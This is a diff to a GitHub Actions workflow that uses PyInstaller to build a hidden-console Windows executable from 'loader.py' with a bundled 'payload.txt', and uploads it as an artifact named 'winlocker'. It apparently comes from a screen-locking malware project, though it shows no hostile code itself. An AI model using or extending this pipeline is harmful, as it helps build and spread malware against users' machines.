@@ -8,18 +8,22 @@ jobs:
 
     steps:
     - uses: actions/checkout@v4
-    - uses: actions/setup-python@v5
+    
+    - name: Set up Python
+      uses: actions/setup-python@v5
       with:
         python-version: '3.10'
         
     - name: Install dependencies
-      run: pip install pyinstaller
+      run: |
+        python -m pip install --upgrade pip
+        pip install pyinstaller
         
-    - name: Build Stub
-      run: pyinstaller --onefile --noconsole stub.py
+    - name: Build Loader
+      run: pyinstaller --onefile --noconsole --add-data "payload.txt;." loader.py
         
     - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
         name: winlocker
-        path: dist/stub.exe
+        path: dist/loader.exe
